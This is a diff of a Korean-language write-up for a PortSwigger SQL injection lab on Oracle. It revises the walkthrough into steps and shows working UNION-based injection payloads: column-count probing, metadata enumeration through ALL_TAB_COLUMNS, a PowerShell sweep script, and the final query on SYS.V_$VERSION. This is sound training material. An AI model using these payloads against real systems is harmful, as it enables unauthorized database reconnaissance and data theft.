@@ -10,21 +10,39 @@ draft: false
 
 # SQL injection attack, querying the database type and version on Oracle
 
-실습 설명에서 출력해야 할 문자열은 알 수 있었지만, 어느 객체에 있는지는 몰랐다. **소유자를 포함한 버전 관련 객체 9개를 스크립트로 전부 검사**해 출처를 찾았다. 아래 쿼리와 결과는 실습 인스턴스에서 확인했다.
+목표 문자열은 실습 설명에 있었지만, 그것을 읽을 객체와 열은 몰랐다. 이 글은 **실제로 확인한 요청과 응답**을 바탕으로, 정답을 모르는 상태에서 다시 따라 할 수 있는 탐색 순서로 정리했다. 초기의 실패 시도와 이후 재검증한 전수 조회는 마지막에 구분해 적었다.
 
-## 1. 조회 형태 확인
+## 1. 반환 열 수와 문자열 출력 위치 확인
 
-`category`에 `' ORDER BY 1 --`, `' ORDER BY 2 --`, `' ORDER BY 3 --`을 차례로 넣었다. 1과 2는 처리되고 3은 HTTP 500이어서 반환 열을 두 개로 판단했다. 다음 요청으로 뷰 이름을 첫 번째 열에 출력해 문자열 출력도 확인했다.
+**질문:** `UNION`에 열을 몇 개 맞춰야 하며, 버전 문자열을 어느 열에 출력할 수 있을까?
+
+**실행:**
+
+~~~sql
+' ORDER BY 1 --
+' ORDER BY 2 --
+' ORDER BY 3 --
+~~~
+
+1과 2는 처리됐고 3은 HTTP 500이었다. 두 열을 쓰는 `UNION` 요청을 보내 첫 번째 열에 문자열이 표시되는지도 확인했다. 두 번째 열은 `NULL`로 채워 열 수를 맞췄다.
 
 ~~~sql
 ' UNION SELECT view_name, NULL FROM all_views --
 ~~~
 
-![뷰 이름을 조회한 화면](https://raw.githubusercontent.com/ddomology/portswigger-lab-notes/main/content/labs/sql-injection/images/lab-querying-database-version-oracle/01-union-select-view-names.png)
+**관찰:** 뷰 이름이 화면에 나왔다.
 
-**다음:** 이름만 수집하면 `FROM`에 쓸 때 소유자를 놓칠 수 있다. 버전 관련 객체를 소유자와 함께 열거한다.
+**판단 → 다음 행동:** 반환 열은 두 개이고 첫 번째 열에 문자열을 출력할 수 있다. 뷰 이름만으로는 소유자와 열을 알 수 없으므로, 메타데이터를 조회한다.
 
-## 2. 소유자 포함 객체 9개와 버전 표식 얻기
+![뷰 이름을 출력한 화면](https://raw.githubusercontent.com/ddomology/portswigger-lab-notes/main/content/labs/sql-injection/images/lab-querying-database-version-oracle/01-union-select-view-names.png)
+
+## 2. 버전 관련 객체를 소유자와 함께 수집
+
+**질문:** 버전 문자열이 들어 있을 만한 객체는 무엇인가?
+
+실습 목표가 버전 조회이므로 먼저 이름에 `VERSION`이 들어간 객체로 범위를 정했다. 데이터베이스 전체를 무작정 조회한 것은 아니다.
+
+**실행:**
 
 ~~~sql
 ' UNION SELECT OWNER || '.' || TABLE_NAME, NULL
@@ -32,24 +50,26 @@ FROM ALL_TAB_COLUMNS
 WHERE TABLE_NAME LIKE '%VERSION%' --
 ~~~
 
-응답에는 서로 다른 객체 9개가 나왔다. `ALL_TAB_COLUMNS`는 객체의 열마다 한 행이므로 `UNION ALL`로 객체명만 출력하면 중복된다. 여기서는 중복을 제거하는 `UNION`을 썼다.
+**관찰:** 서로 다른 객체 **9개**가 나왔다. `ALL_TAB_COLUMNS`는 열마다 한 행이므로, 객체명만 출력할 때는 중복을 제거하는 `UNION`을 사용했다.
 
-이름만으로 어느 열에 버전 문구가 있는지 알 수 없어, 먼저 이해하기 쉬운 제품 버전 정보를 조회했다.
+**판단 → 다음 행동:** `OWNER.TABLE_NAME`을 보존한 채 각 객체의 열 이름과 자료형을 확인한다. 이름만 보고 특정 뷰를 정답으로 가정하지 않는다.
 
 ~~~sql
-' UNION SELECT PRODUCT || ' | ' || VERSION || ' | ' || STATUS, NULL
-FROM PRODUCT_COMPONENT_VERSION --
+' UNION ALL SELECT OWNER || '|' || TABLE_NAME || '|' ||
+                   COLUMN_NAME || '|' || DATA_TYPE, NULL
+FROM ALL_TAB_COLUMNS
+WHERE TABLE_NAME LIKE '%VERSION%' --
 ~~~
 
-`Oracle Database 11g Express Edition | 11.2.0.2.0 | 64bit Production` 등을 포함한 **네 행**이 나왔다. 여기서 검색 표식 `11.2.0.2.0`을 얻었다. 하지만 `CORE` 행은 없고 화면은 **Not solved**였다.
+**관찰:** 이 조회에서 9개 객체의 열 **48개**가 확인됐다. 열 정보는 값이 아니므로, 어느 객체에 실제 행이 있고 어느 열에 목표 문구가 있는지는 아직 모른다.
 
-![제품 버전 네 행과 Not solved 상태](https://raw.githubusercontent.com/ddomology/portswigger-lab-notes/main/content/labs/sql-injection/images/lab-querying-database-version-oracle/03-product-component-version-not-solved.png)
+**판단 → 다음 행동:** 아홉 객체 모두의 행 수를 확인한 뒤, 값이 있는 객체의 열을 표식으로 검색한다.
 
-**다음:** 이 표식을 기준으로 9개 객체의 열을 빠짐없이 검사한다.
+## 3. 9개 객체의 값을 스크립트로 검사
 
-## 3. PowerShell로 9개 객체 전수 조회
+**질문:** 48개 열 중 목표 문자열을 실제로 담은 열은 무엇인가?
 
-[전수 조회 스크립트](https://github.com/ddomology/portswigger-lab-notes/blob/main/scripts/oracle-version-sweep.ps1)는 `ALL_TAB_COLUMNS`에서 9개 객체와 **48개 열**을 읽는다. 객체명은 `OWNER.TABLE_NAME`으로 보관한다. 각 객체의 행 수를 확인한 뒤, 행이 있는 객체의 모든 열을 소유자 포함 이름으로 조회해 `11.2.0.2.0`이 들어간 값을 찾는다. 결과는 열당 최대 20건만 출력한다.
+실습 설명에 나온 `11.2.0.2.0`을 검색 표식으로 사용했다. [PowerShell 전수 조회 스크립트](https://github.com/ddomology/portswigger-lab-notes/blob/main/scripts/oracle-version-sweep.ps1)는 위 메타데이터에서 객체·열을 받아 **소유자 포함 이름**으로 요청을 만든다.
 
 ~~~powershell
 pwsh -File .\scripts\oracle-version-sweep.ps1 `
@@ -58,29 +78,33 @@ pwsh -File .\scripts\oracle-version-sweep.ps1 `
   -OutputPath 'version-sweep.json'
 ~~~
 
-| 소유자 포함 객체 | 행 수 | 표식 일치 결과 |
+스크립트는 먼저 객체마다 `COUNT(*)`를 조회한다. 행이 0개인 객체 네 곳은 값 검색을 건너뛰고, 나머지 다섯 객체의 **17개 열**에서 표식이 들어간 값을 찾는다. 출력은 열당 최대 20건으로 제한한다.
+
+| 소유자 포함 객체 | 행 수 | `11.2.0.2.0` 일치 결과 |
 | --- | ---: | --- |
 | `SYS.ALL_FILE_GROUP_VERSIONS` | 0 | 없음 |
 | `SYS.ALL_TYPE_VERSIONS` | 10,191 | 없음 |
-| `SYS.GV_$VERSION` | 5 | `BANNER` 다섯 행 |
-| `SYS.PRODUCT_COMPONENT_VERSION` | 4 | `VERSION` 네 행 |
+| `SYS.GV_$VERSION` | 5 | `BANNER` 5행 |
+| `SYS.PRODUCT_COMPONENT_VERSION` | 4 | `VERSION` 4행 |
 | `SYS.SM_$VERSION` | 1 | 없음 |
 | `SYS.USER_FILE_GROUP_VERSIONS` | 0 | 없음 |
 | `SYS.USER_TYPE_VERSIONS` | 0 | 없음 |
-| `SYS.V_$VERSION` | 5 | `BANNER` 다섯 행 |
+| `SYS.V_$VERSION` | 5 | `BANNER` 5행 |
 | `SYS._ALL_FILE_GROUP_VERSIONS` | 0 | 없음 |
 
-행이 없는 네 객체는 값을 조회할 필요가 없었다. 나머지 객체의 **17개 열**을 검사해 총 14개 일치 행을 얻었다. `ALL_TYPE_VERSIONS`의 열을 한 요청으로 묶은 조회는 HTTP 400이어서, 스크립트가 8개 열을 개별 재시도했다. 모두 HTTP 200이었고 일치값은 없었다.
+**관찰:** 총 14개 행이 표식과 일치했다. `PRODUCT_COMPONENT_VERSION.VERSION`의 네 행은 버전 번호만 보여줬다. 반면 `GV_$VERSION.BANNER`와 `V_$VERSION.BANNER`는 실습 설명의 **완전한 문자열 다섯 개**를 각각 반환했다. `ALL_TYPE_VERSIONS`의 묶음 요청은 HTTP 400이어서 스크립트가 그 객체의 8개 열을 개별 재시도했고, 모두 200·일치값 없음으로 확인했다.
 
-`GV_$VERSION.BANNER`와 `V_$VERSION.BANNER`가 목표 문자열 다섯 개를 그대로 반환했다. 반면 `PRODUCT_COMPONENT_VERSION.VERSION`은 버전 번호 네 개만 반환했다. 따라서 `BANNER`를 직접 출력해 실습 판정을 확인했다.
+**판단 → 다음 행동:** 제품 버전 번호만 있는 열보다 전체 문구가 있는 `BANNER`가 목표에 맞다. 후보 하나를 직접 출력하고 실습 판정을 확인한다.
 
-## 4. 찾은 열로 최종 확인
+## 4. 찾은 열을 직접 출력해 판정 확인
+
+**실행:**
 
 ~~~sql
 ' UNION ALL SELECT "BANNER", NULL FROM "SYS"."V_$VERSION" --
 ~~~
 
-HTTP 200 응답에 다음 다섯 행이 나왔고, 상태가 **LAB Solved**로 바뀌었다.
+**관찰:** HTTP 200으로 다음 다섯 행이 출력됐고, 실습 상태가 **LAB Solved**로 바뀌었다.
 
 ~~~text
 Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
@@ -90,9 +114,20 @@ TNS for Linux: Version 11.2.0.2.0 - Production
 NLSRTL Version 11.2.0.2.0 - Production
 ~~~
 
-## 당시 HTTP 500의 원인
+**판단:** 메타데이터에서 출발해 9개 후보를 검사한 결과와 실제 `Solved` 판정이 일치했다.
 
-첫 반복 시도는 `OWNER`를 저장하지 않고 `FROM "V_$VERSION"`처럼 객체명만 사용했다. 문자열 열 조회와 `COUNT(*)` 조회가 모두 500이었다. 같은 뷰를 `FROM "SYS"."V_$VERSION"`으로 조회하자 행 수 5와 `BANNER` 값이 정상 반환됐다. 즉 **이 시도의 500은 소유자를 빠뜨린 객체 참조 때문**이었다. 응답에는 Oracle 오류 번호가 없어 정확한 `ORA-` 코드는 확인하지 못했다.
+## 초기 시도와 HTTP 500에서 배운 점
+
+처음에는 `PRODUCT_COMPONENT_VERSION`의 `PRODUCT`·`VERSION`·`STATUS`를 합쳐 네 행을 출력했다. 버전 번호는 확인했지만 `CORE` 행이 없고 화면은 **Not solved**였다. 따라서 구분자를 고치는 것만으로는 부족하다고 판단했다.
+
+~~~sql
+' UNION SELECT PRODUCT || ' | ' || VERSION || ' | ' || STATUS, NULL
+FROM PRODUCT_COMPONENT_VERSION --
+~~~
+
+![네 행이 표시됐지만 Not solved인 화면](https://raw.githubusercontent.com/ddomology/portswigger-lab-notes/main/content/labs/sql-injection/images/lab-querying-database-version-oracle/03-product-component-version-not-solved.png)
+
+초기 반복 조회에서는 `OWNER`를 저장하지 않아 `FROM "V_$VERSION"`처럼 참조했고, 문자열 조회와 `COUNT(*)`가 모두 HTTP 500이었다. 같은 객체를 `FROM "SYS"."V_$VERSION"`으로 조회하면 행 수 5와 `BANNER`가 정상 반환됐다. **소유자 포함 이름으로 재시도해 문제를 해결했지만**, 응답이 Oracle 오류 번호를 숨겼으므로 정확한 `ORA-` 코드는 알 수 없다. 위의 9개 객체 전수 조회는 이 시행착오 후에 같은 방식으로 재검증한 결과다.
 
 ## 참고
 
